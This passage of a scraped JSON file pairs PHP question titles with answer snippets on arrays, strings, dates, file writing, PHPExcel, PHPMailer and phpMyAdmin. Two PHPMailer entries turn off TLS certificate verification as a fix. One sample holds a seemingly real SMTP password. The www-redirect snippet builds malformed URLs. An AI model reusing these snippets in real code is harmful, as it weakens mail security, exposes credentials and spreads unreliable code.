    "description": "$phone = '000-0000-0000';  if(preg_match(\"/^[0-9]{3}-[0-9]{4}-[0-9]{4}$/\", $phone)) {   // $phone is valid }\n",
    "reg_date": "2021-10-12T10:19:38.000Z"
  },
  {
    "id": 4365,
    "keyword": null,
    "link": null,
    "title": " php validation code for checkbox",
    "description": "if(isset($_POST['checkbox_name']) && $_POST['checkbox_name']!=\"\") {     echo 'checkbox is checked';  } \n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4366,
    "keyword": null,
    "link": null,
    "title": " php value in array",
    "description": "$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n<?php $os = array(\"Apple\", \"Banana\", \"Lemon\"); if (in_array(\"Apple\", $os)) {     echo \"Yeah. Exist Apple\"; } if (!in_array(\"Buleberry\", $os)) {     echo \"Oh, Don't Exist Blueberry!!!\"; } ?>\n$colors = array(\"red\", \"blue\", \"green\");    if (in_array(\"red\", $colors)) {  \techo \"found red in array\";  } \n<?php $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Existe Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Existe mac\"; } ?>\nin_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool    // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\nin_array ( mixed $needle , array $haystack , bool $strict = false ) : bool\n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4367,
    "keyword": null,
    "link": null,
    "title": " php var dump die",
    "description": "$variable = \"hello\";  var_dump($variable); die();\n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4368,
    "keyword": null,
    "link": null,
    "title": " php var export to string",
    "description": "$someString = var_export($anyVariable, true);\n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4369,
    "keyword": null,
    "link": null,
    "title": " php variable in string",
    "description": "$a = '12345';  // This works: echo \"qwe{$a}rty\"; // qwe12345rty, using braces echo \"qwe\" . $a . \"rty\"; // qwe12345rty, concatenation used  // Does not work: echo 'qwe{$a}rty'; // qwe{$a}rty, single quotes are not parsed echo \"qwe$arty\"; // qwe, because $a became $arty, which is undefined\n<?php   $string = 'string';   $number = 1; ?>\n$string3 = $string1 . $string2;\nphpCopy# php 7.* <?php $txt = \"salt\"; echo \"{$txt}y\"; ?> \nphpCopy#php 7.x <?php $prefix = \"Comfort\"; $suffix = \"able\"; echo \"{$prefix}{$suffix}\"; ?> \nphpCopy#php 7.x <?php $taste = \"ie\"; echo sweet.$taste; ?> \n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4370,
    "keyword": null,
    "link": null,
    "title": " php variable outside foreach",
    "description": "$categorySize = array();  <?php  $categories = Mage::getModel('catalog/category')->getCollection()->addAttributeToSelect('*');           foreach ($categories as $category):           $categorySize = $category->getSize_chart();           print_r ($categorySize);           endforeach;     ?>  print_r($categorySize) //Now you can get it outside the loop  \n$pages = get_pages(); $pagee = array(); foreach ($pages as $page) {   $pagee[] = $page->post_title; } echo implode(\",\",$pagee); \n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4371,
    "keyword": null,
    "link": null,
    "title": " php variable parameters",
    "description": "<?php     function some_func($a, $b) {         for ($i = 0; $i < func_num_args(); ++$i) {             $param = func_get_arg($i);             echo \"Received parameter $param.\\n\";         }     }      function some_other_func($a, $b) {         $param = func_get_args();         $param = join(\", \", $param);         echo \"Received parameters: $param.\\n\";     }      some_func(1,2,3,4,5,6,7,8);     some_other_func(1,2,3,4,5,6,7,8); ?> \n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4372,
    "keyword": null,
    "link": null,
    "title": " php virheilmoitukset",
    "description": "<?php ini_set(\"display_errors\", 1); ini_set(\"error_reporting\", E_ALL | E_STRICT); // koodi tulee t&auml;h&auml;n ?>\n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4373,
    "keyword": null,
    "link": null,
    "title": " php warning: 'c:\\windows\\system32\\vcruntime140.dll' 14.0 is not compatible with this php build linked with 14.28 in unknown on line 0",
    "description": "Download the latest version of Microsoft Visual C++, I successfully solved this problem.  You can download it here .  https://support.microsoft.com/en-us/help/2977003/the-latest-supported-visual-c-downloads\n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4374,
    "keyword": null,
    "link": null,
    "title": " php warning: php startup: unable to load dynamic library",
    "description": "If you are a windows user, make sure to uncomment this line in your php.ini  file: \t extension_dir = \"ext\"\nIt means there is an extension=... or zend_extension=... line in one of your php configuration files (php.ini, or another close to it) that is trying to load that extension : ixed.5.2.lin  Unfortunately that file or path doesn't exist or the permissions are incorrect.  Try to search in the .ini files that are loaded by PHP (phpinfo() can indicate which ones are) - one of them should try to load that extension. Either correct the path to the file or comment out the corresponding line.\nextension_dir=\"C:\\full\\path\\to\\php\\ext\\dir\" \ncomment out this line by adding a semi-colon in front ;extension=apc.so \n",
    "reg_date": "2021-10-12T10:19:39.000Z"
  },
  {
    "id": 4375,
    "keyword": null,
    "link": null,
    "title": " php week of a date",
    "description": "$dayofweek = date('w', strtotime($date)); $result    = date('Y-m-d', strtotime(($day - $dayofweek).' day', strtotime($date)));\ndate('w'); //gets day of week as number(0=sunday,1=monday...,6=sat)  //note:returns 0 through 6 but as string so to check if monday do this: if(date('w') == 1){ \techo \"its monday baby\"; }\n Things to be aware of when using week numbers with years.  <?php echo date(\"YW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"YW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"YW\", strtotime(\"2011-01-01\")); // gives 201152 too ?>  BUT  <?php echo date(\"oW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"oW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"oW\", strtotime(\"2011-01-01\")); // gives 201052 (Year is different than previous example) ?>  Reason: Y is year from the date o is ISO-8601 year number W is ISO-8601 week number of year  Conclusion: if using 'W' for the week number use 'o' for the year. \n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4376,
    "keyword": null,
    "link": null,
    "title": " php weekdays",
    "description": "0 : sunday, 1 : monday, 2 : tuesday, 3 : wednesday, 4 : thursday, 5 : friday, 6 : saturday,\ndate(\"d.m.Y\", strtotime($mysqltimestamp)\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4377,
    "keyword": null,
    "link": null,
    "title": " php what type of variable is it",
    "description": "echo gettype($var1).\"\\n\";  echo gettype($var2).\"\\n\";  echo gettype($var3).\"\\n\"; \n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4378,
    "keyword": null,
    "link": null,
    "title": " php where is ini file",
    "description": "php --ini\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4379,
    "keyword": null,
    "link": null,
    "title": " php while loop array",
    "description": "       $foodArray = [\"Eggs\", \"Bacon\", \"HashBrowns\", \"Beans\", \"Bread\"];          foreach ($foodArray as $food)  {             echo $food .\"<br />\";         }\n<?php \t$a = 0; \twhile($a<=5){     \techo $a.\"<br>\";       $a++;     }   ?>\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4380,
    "keyword": null,
    "link": null,
    "title": " php word wrap",
    "description": "<?php $str = \"An example of a long word is: Supercalifragulistic\"; echo wordwrap($str,15,\"<br>\\n\"); ?>\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4381,
    "keyword": null,
    "link": null,
    "title": " php words capitalized",
    "description": " <?php $foo = 'bonjour tout le monde!'; $foo = ucfirst($foo);             // Bonjour tout le monde!  $bar = 'BONJOUR TOUT LE MONDE!'; $bar = ucfirst($bar);             // BONJOUR TOUT LE MONDE! $bar = ucfirst(strtolower($bar)); // Bonjour tout le monde! ?>  \n/*  \tThis only Capitalizes words in a string that are entirely alphabetic      and other words are made UPPERCASE     Works well if you have a string  of words containing a mixture     of English words and part codes etc */  $words = explode(\" \", $originalString); $finalString = \"\"; \tforeach($words as $word) { \t\tif(ctype_alpha($word)) { \t\t\t$word = ucfirst(strtolower($word)); \t\t} \t\telse { \t\t\t$word = strtoupper($word); \t\t} \t\t$finalString .= $word.\" \"; \t} echo rtrim($finalString);\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4382,
    "keyword": null,
    "link": null,
    "title": " php wp copyright and year",
    "description": "function comicpress_copyright() // returns:  (c) My blog Name 2014 - 2021 {     global $wpdb;     $copyright_dates = $wpdb->get_results(\"     SELECT     YEAR(min(post_date_gmt)) AS firstdate,     YEAR(max(post_date_gmt)) AS lastdate     FROM     $wpdb->posts     WHERE     post_status = 'publish'     \");     $output = '';     if ($copyright_dates) {         $copyright = \"&copy; \" . get_bloginfo('name') . ' ' . $copyright_dates[0]->firstdate;         if ($copyright_dates[0]->firstdate != $copyright_dates[0]->lastdate) {             $copyright .= '-' . $copyright_dates[0]->lastdate;         }         $output = $copyright;     }     return $output; }\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4383,
    "keyword": null,
    "link": null,
    "title": " php write csv",
    "description": "// open the file \"demosaved.csv\" for writing $file = fopen('demosaved.csv', 'w');   // save the column headers fputcsv($file, array('Column 1', 'Column 2', 'Column 3', 'Column 4', 'Column 5'));   // Sample data. This can be fetched from mysql too $data = array( array('Data 11', 'Data 12', 'Data 13', 'Data 14', 'Data 15'), array('Data 21', 'Data 22', 'Data 23', 'Data 24', 'Data 25'), array('Data 31', 'Data 32', 'Data 33', 'Data 34', 'Data 35'), array('Data 41', 'Data 42', 'Data 43', 'Data 44', 'Data 45'), array('Data 51', 'Data 52', 'Data 53', 'Data 54', 'Data 55') );   // save each row of the data foreach ($data as $row) { fputcsv($file, $row); }   // Close the file fclose($file);\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4384,
    "keyword": null,
    "link": null,
    "title": " php write to file",
    "description": "// LOCK_EX will prevent anyone else writing to the file at the same time // PHP_EOL will add linebreak after each line $txt = \"data-to-add\"; $myfile = file_put_contents('logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);  // Second option is this $myfile = fopen(\"logs.txt\", \"a\") or die(\"Unable to open file!\"); $txt = \"user id date\"; fwrite($myfile, \"\\n\". $txt); fclose($myfile);\n$myfile = fopen(\"newfile.txt\", \"w\") or die(\"Unable to open file!\"); fwrite($myfile, \"Content to write to file\"); fclose($myfile);\n$myFile = \"testFile.txt\"; $fh = fopen($myFile, 'w') or die(\"can't open file\"); $stringData = \"Bobby Bopper\\n\"; fwrite($fh, $stringData); $stringData = \"Tracy Tanner\\n\"; fwrite($fh, $stringData); fclose($fh); \n$data[] = $_POST['data'];  $inp = file_get_contents('results.json'); $tempArray = json_decode($inp); array_push($tempArray, $data); $jsonData = json_encode($tempArray); file_put_contents('results.json', $jsonData);\n<?php $myfile = fopen(\"file_name.txt\", \"w\") or die(\"Unable to open file!\"); $txt = \"Hello world\\n\"; fwrite($myfile, $txt); $txt = \" Php.\\n\"; fwrite($myfile, $txt); fclose($myfile); ?>\nfile_put_contents ($filename, $data, $flags = 0, $context = null): int\n",
    "reg_date": "2021-10-12T10:19:40.000Z"
  },
  {
    "id": 4385,
    "keyword": null,
    "link": null,
    "title": " php write to standard out",
    "description": "fwrite(STDOUT, 'foo');\n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4386,
    "keyword": null,
    "link": null,
    "title": " php www to non www redirect",
    "description": "$url = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];  if (preg_match('/www./', $url)){    $url = str_replace('www.','https://', $url);    header( \"HTTP/1.1 301 Moved Permanently\" );   header( 'Location: ' . $url );   exit; }\n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4387,
    "keyword": null,
    "link": null,
    "title": " php xml string",
    "description": "$object = json_decode(json_encode(simplexml_load_string($xml)));\nhtmlspecialchars($string, ENT_XML1 | ENT_QUOTES, 'UTF-8');// will convert ' to &apos; in addition to &, <, > and \"( not | ) \n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4388,
    "keyword": null,
    "link": null,
    "title": " php xml to array",
    "description": "public function xmlToArray($xmlstring){        $xml = simplexml_load_string($xmlstring, \"SimpleXMLElement\", LIBXML_NOCDATA);   $json = json_encode($xml);   $array = json_decode($json,TRUE);    return $array;  }\n$xmlfile = file_get_contents($path); \t\t$ob= simplexml_load_string($xmlfile); \t\t$json  = json_encode($ob); \t\t$configData = json_decode($json, true); \n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4389,
    "keyword": null,
    "link": null,
    "title": " php yesterday",
    "description": "date('F j, Y',strtotime(\"-1 days\"));\n$yesterday = new DateTime('yesterday'); echo $yesterday->format('Y-m-d');\ndate(\"F j, Y\", time() - 86400);\n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4390,
    "keyword": null,
    "link": null,
    "title": " php ziparchive compress folder",
    "description": "<?php class FlxZipArchive extends ZipArchive  {  public function addDir($location, $name)   {        $this->addEmptyDir($name);        $this->addDirDo($location, $name);  }   private function addDirDo($location, $name)   {     $name .= '/';     $location .= '/';     $dir = opendir ($location);     while ($file = readdir($dir))     {         if ($file == '.' || $file == '..') continue;         $do = (filetype( $location . $file) == 'dir') ? 'addDir' : 'addFile';         $this->$do($location . $file, $name . $file);     }  }  } ?>  <?php $the_folder = '/path/to/folder/to/be/zipped'; $zip_file_name = '/path/to/zip/archive.zip'; $za = new FlxZipArchive; $res = $za->open($zip_file_name, ZipArchive::CREATE); if($res === TRUE)  {     $za->addDir($the_folder, basename($the_folder));     $za->close(); } else{ echo 'Could not create a zip archive'; } ?>\n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4391,
    "keyword": null,
    "link": null,
    "title": " phpcs",
    "description": "composer global require \"squizlabs/php_codesniffer=*\" \n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4392,
    "keyword": null,
    "link": null,
    "title": " phpexcel fill background color",
    "description": "$page = 0; $this->PhpExcel->createSheet($page); $this->PhpExcel->setActiveSheetIndex($page); $sheet = $this->PhpExcel->getActiveSheet();  $sheet->getStyle(\"A1:A7\")->applyFromArray(   array(     'fill' => array(       'type' => PHPExcel_Style_Fill::FILL_SOLID,       'color' => array('rgb' => 'FFE699')     ),     'borders' => array (       'allborders' => array (         'style' => PHPExcel_Style_Border::BORDER_THIN,         'color' => array('rgb' => '000000'),        // BLACK       )     )   ) );\n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4393,
    "keyword": null,
    "link": null,
    "title": " phpexcel fill border color",
    "description": "$page = 0; $this->PhpExcel->createSheet($page); $this->PhpExcel->setActiveSheetIndex($page); $sheet = $this->PhpExcel->getActiveSheet();  $sheet->getStyle(\"A1:A7\")->applyFromArray(   array(     'fill' => array(       'type' => PHPExcel_Style_Fill::FILL_SOLID,       'color' => array('rgb' => 'FFE699')     ),     'borders' => array (       'allborders' => array (         'style' => PHPExcel_Style_Border::BORDER_THIN,         'color' => array('rgb' => '000000'),        // BLACK       )     )   ) );\n",
    "reg_date": "2021-10-12T10:19:41.000Z"
  },
  {
    "id": 4394,
    "keyword": null,
    "link": null,
    "title": " phpexcel format cell background color",
    "description": "$page = 0; $this->PhpExcel->createSheet($page); $this->PhpExcel->setActiveSheetIndex($page); $sheet = $this->PhpExcel->getActiveSheet();  $sheet->getStyle(\"A1:A7\")->applyFromArray(   array(     'fill' => array(       'type' => PHPExcel_Style_Fill::FILL_SOLID,       'color' => array('rgb' => 'FFE699')     ),     'borders' => array (       'allborders' => array (         'style' => PHPExcel_Style_Border::BORDER_THIN,         'color' => array('rgb' => '000000'),        // BLACK       )     )   ) );\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4395,
    "keyword": null,
    "link": null,
    "title": " phpexcel set font color",
    "description": "$this->PhpExcel->createSheet($page); $this->PhpExcel->setActiveSheetIndex($page); $sheet = $this->PhpExcel->getActiveSheet();  $sheet->getStyle(\"A8:C8\")->getFont()->setBold(true) ->setName('Arial') ->setSize(14) ->getColor() ->setRGB('FFFFFF'); $sheet->getStyle(\"A8:C8\")->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER); \n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4396,
    "keyword": null,
    "link": null,
    "title": " phpexcel set row height",
    "description": "for ($i = 1; $i <= 12; $i ++) {   $sheet->getRowDimension($i)->setRowHeight(35); } \t\t\t\t\t\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4397,
    "keyword": null,
    "link": null,
    "title": " phpexcel set width",
    "description": "$this->PhpExcel->createSheet($page); $this->PhpExcel->setActiveSheetIndex($page); $sheet = $this->PhpExcel->getActiveSheet();  $sheet->getColumnDimension('A')->setWidth(40); $sheet->getColumnDimension('B')->setWidth(28); $sheet->getColumnDimension('C')->setWidth(25); $sheet->getStyle(\"A8:C8\")->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4398,
    "keyword": null,
    "link": null,
    "title": " phph for",
    "description": "for ($i = 1; $i <= 10; $i++) {     echo $i; }\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4399,
    "keyword": null,
    "link": null,
    "title": " phph get server protocol",
    "description": "$protocol = stripos($_SERVER['SERVER_PROTOCOL'],'https') === 0 ? 'https://' : 'http://'; \n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4400,
    "keyword": null,
    "link": null,
    "title": " phpmailer add reply to",
    "description": "$mail->addReplyTo('replyto@email.com', 'Reply to name');\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4401,
    "keyword": null,
    "link": null,
    "title": " phpmailer doesnt work",
    "description": "$mail->SMTPOptions = array(         'ssl' => array(             'verify_peer' => false,             'verify_peer_name' => false,             'allow_self_signed' => true         )     );\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4402,
    "keyword": null,
    "link": null,
    "title": " phpmailer doesnt work on infinityfree",
    "description": "$mail->SMTPOptions = array(         'ssl' => array(             'verify_peer' => false,             'verify_peer_name' => false,             'allow_self_signed' => true         )     );\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4403,
    "keyword": null,
    "link": null,
    "title": " phpmailer example php",
    "description": "<?php  require_once('class.phpmailer.php');  $mailer = new PHPMailer(); $mailer->IsSMTP(); $mailer->SMTPDebug = 1; $mailer->Port = 587; //Indica a porta de conex&atilde;o  $mailer->Host = 'smtplw.com.br';//Endere&ccedil;o do Host do SMTP  $mailer->SMTPAuth = true; //define se haver&aacute; ou n&atilde;o autentica&ccedil;&atilde;o  $mailer->Username = 'smtplocaweb'; //Login de autentica&ccedil;&atilde;o do SMTP $mailer->Password = 'Gwb9etA323'; //Senha de autentica&ccedil;&atilde;o do SMTP $mailer->FromName = 'Bart S. Locaweb'; //Nome que ser&aacute; exibido $mailer->From = 'remetente@email.com.br'; //Obrigat&oacute;rio ser  a mesma caixa postal configurada no remetente do SMTP $mailer->AddAddress('destinatario@email.com','Nome do  destinat&aacute;rio'); //Destinat&aacute;rios $mailer->Subject = 'Teste enviado atrav&eacute;s do PHP Mailer  SMTPLW'; $mailer->Body = 'Este &eacute; um teste realizado com o PHP Mailer  SMTPLW'; if(!$mailer->Send()) { echo \"Message was not sent\"; echo \"Mailer Error: \" . $mailer->ErrorInfo; exit; } print \"E-mail enviado!\" ?>  \n<?php // Import PHPMailer classes into the global namespace // These must be at the top of your script, not inside a function use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception;  // Load Composer's autoloader require 'vendor/autoload.php';  // Instantiation and passing `true` enables exceptions $mail = new PHPMailer(true);  try {     //Server settings     $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output     $mail->isSMTP();                                            // Send using SMTP     $mail->Host       = 'smtp1.example.com';                    // Set the SMTP server to send through     $mail->SMTPAuth   = true;                                   // Enable SMTP authentication     $mail->Username   = 'user@example.com';                     // SMTP username     $mail->Password   = 'secret';                               // SMTP password     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged     $mail->Port       = 587;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above      //Recipients     $mail->setFrom('from@example.com', 'Mailer');     $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient     $mail->addAddress('ellen@example.com');               // Name is optional     $mail->addReplyTo('info@example.com', 'Information');     $mail->addCC('cc@example.com');     $mail->addBCC('bcc@example.com');      // Attachments     $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments     $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name      // Content     $mail->isHTML(true);                                  // Set email format to HTML     $mail->Subject = 'Here is the subject';     $mail->Body    = 'This is the HTML message body <b>in bold!</b>';     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';      $mail->send();     echo 'Message has been sent'; } catch (Exception $e) {     echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\"; }\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4404,
    "keyword": null,
    "link": null,
    "title": " phpmailer hostinger",
    "description": "<?php use PHPMailer\\PHPMailer\\PHPMailer; require 'vendor/autoload.php'; $mail = new PHPMailer; $mail->isSMTP(); $mail->SMTPDebug = 2; $mail->Host = 'smtp.hostinger.com'; $mail->Port = 587; $mail->SMTPAuth = true; $mail->Username = 'test@hostinger-tutorials.com'; $mail->Password = 'YOUR PASSWORD HERE'; $mail->setFrom('test@hostinger-tutorials.com', 'Your Name'); $mail->addReplyTo('test@hostinger-tutorials.com', 'Your Name'); $mail->addAddress('example@email.com', 'Receiver Name'); $mail->Subject = 'Testing PHPMailer'; $mail->msgHTML(file_get_contents('message.html'), __DIR__); $mail->Body = 'This is a plain text message body'; //$mail->addAttachment('test.txt'); if (!$mail->send()) {     echo 'Mailer Error: ' . $mail->ErrorInfo; } else {     echo 'The email message was sent.'; } ?>\n",
    "reg_date": "2021-10-12T10:19:42.000Z"
  },
  {
    "id": 4405,
    "keyword": null,
    "link": null,
    "title": " phpmailer install composer",
    "description": "<?php // Import PHPMailer classes into the global namespace // These must be at the top of your script, not inside a function use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception;  // Load Composer's autoloader require 'vendor/autoload.php';  // Instantiation and passing `true` enables exceptions $mail = new PHPMailer(true);  try {     //Server settings     $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output     $mail->isSMTP();                                            // Send using SMTP     $mail->Host       = 'smtp1.example.com';                    // Set the SMTP server to send through     $mail->SMTPAuth   = true;                                   // Enable SMTP authentication     $mail->Username   = 'user@example.com';                     // SMTP username     $mail->Password   = 'secret';                               // SMTP password     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged     $mail->Port       = 587;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above      //Recipients     $mail->setFrom('from@example.com', 'Mailer');     $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient     $mail->addAddress('ellen@example.com');               // Name is optional     $mail->addReplyTo('info@example.com', 'Information');     $mail->addCC('cc@example.com');     $mail->addBCC('bcc@example.com');      // Attachments     $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments     $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name      // Content     $mail->isHTML(true);                                  // Set email format to HTML     $mail->Subject = 'Here is the subject';     $mail->Body    = 'This is the HTML message body <b>in bold!</b>';     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';      $mail->send();     echo 'Message has been sent'; } catch (Exception $e) {     echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\"; }\n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4406,
    "keyword": null,
    "link": null,
    "title": " phpmailer send attachment",
    "description": "    $filename = 'myfile';     $path = 'your path goes here';     $file = $path . \"/\" . $filename;      $mailto = 'mail@mail.com';     $subject = 'Subject';     $message = 'My message';      $content = file_get_contents($file);     $content = chunk_split(base64_encode($content));      // a random hash will be necessary to send mixed content     $separator = md5(time());      // carriage return type (RFC)     $eol = \"\\r\\n\";      // main header (multipart mandatory)     $headers = \"From: name <test@test.com>\" . $eol;     $headers .= \"MIME-Version: 1.0\" . $eol;     $headers .= \"Content-Type: multipart/mixed; boundary=\\\"\" . $separator . \"\\\"\" . $eol;     $headers .= \"Content-Transfer-Encoding: 7bit\" . $eol;     $headers .= \"This is a MIME encoded message.\" . $eol;      // message     $body = \"--\" . $separator . $eol;     $body .= \"Content-Type: text/plain; charset=\\\"iso-8859-1\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: 8bit\" . $eol;     $body .= $message . $eol;      // attachment     $body .= \"--\" . $separator . $eol;     $body .= \"Content-Type: application/octet-stream; name=\\\"\" . $filename . \"\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: base64\" . $eol;     $body .= \"Content-Disposition: attachment\" . $eol;     $body .= $content . $eol;     $body .= \"--\" . $separator . \"--\";      //SEND Mail     if (mail($mailto, $subject, $body, $headers)) {         echo \"mail send ... OK\"; // or use booleans here     } else {         echo \"mail send ... ERROR!\";         print_r( error_get_last() );     } \n    $filename = 'myfile';     $path = 'your path goes here';     $file = $path . \"/\" . $filename;      $mailto = 'mail@mail.com';     $subject = 'Subject';     $message = 'My message';      $content = file_get_contents($file);     $content = chunk_split(base64_encode($content));      // a random hash will be necessary to send mixed content     $separator = md5(time());      // carriage return type (RFC)     $eol = \"\\r\\n\";      // main header (multipart mandatory)     $headers = \"From: name <test@test.com>\" . $eol;     $headers .= \"MIME-Version: 1.0\" . $eol;     $headers .= \"Content-Type: multipart/mixed; boundary=\\\"\" . $separator . \"\\\"\" . $eol;     $headers .= \"Content-Transfer-Encoding: 7bit\" . $eol;     $headers .= \"This is a MIME encoded message.\" . $eol;      // message     $body = \"--\" . $separator . $eol;     $body .= \"Content-Type: text/plain; charset=\\\"iso-8859-1\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: 8bit\" . $eol;     $body .= $message . $eol;      // attachment     $body .= \"--\" . $separator . $eol;     $body .= \"Content-Type: application/octet-stream; name=\\\"\" . $filename . \"\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: base64\" . $eol;     $body .= \"Content-Disposition: attachment\" . $eol;     $body .= $content . $eol;     $body .= \"--\" . $separator . \"--\";      //SEND Mail     if (mail($mailto, $subject, $body, $headers)) {         echo \"mail send ... OK\"; // or use booleans here     } else {         echo \"mail send ... ERROR!\";         print_r( error_get_last() );     }\n$mail->AddAttachment($_FILES['uploaded_file']['tmp_name'], $_FILES['uploaded_file']['name']); \n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4407,
    "keyword": null,
    "link": null,
    "title": " phpmailer with laravel",
    "description": "<?php namespace App\\Http\\Controllers;  use PHPMailer\\PHPMailer;  class testPHPMailer extends Controller {     public function index()     {         $text             = 'Hello Mail';         $mail             = new PHPMailer\\PHPMailer(); // create a n         $mail->SMTPDebug  = 1; // debugging: 1 = errors and messages, 2 = messages only         $mail->SMTPAuth   = true; // authentication enabled         $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail         $mail->Host       = \"smtp.gmail.com\";         $mail->Port       = 465; // or 587         $mail->IsHTML(true);         $mail->Username = \"testmail@gmail.com\";         $mail->Password = \"testpass\";         $mail->SetFrom(\"testmail@gmail.com\", 'Sender Name');         $mail->Subject = \"Test Subject\";         $mail->Body    = $text;         $mail->AddAddress(\"testreciver@gmail.com\", \"Receiver Name\");         if ($mail->Send()) {             return 'Email Sended Successfully';         } else {             return 'Failed to Send Email';         }     } } \ncomposer require phpmailer/phpmailer \n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4408,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin add foreign key",
    "description": "ALTER TABLE table_name ADD CONSTRAINT fk_foreign_key_name FOREIGN KEY (foreign_key_name) REFERENCES target_table(target_key_name);\nALTER TABLE table_name     ADD CONSTRAINT fk_foreign_key_name     FOREIGN KEY (foreign_key_name)     REFERENCES target_table(target_key_name); \n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4409,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin change database import size",
    "description": "Just change your php.ini(xampp/php/php.ini) file, it worked for me!  max_execution_time = 5000 max_input_time = 5000 memory_limit = 1000M post_max_size = 750M upload_max_filesize = 750M  And, don't forget to restart Apache Module from XAMPP Control Panel. \n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4410,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin export database",
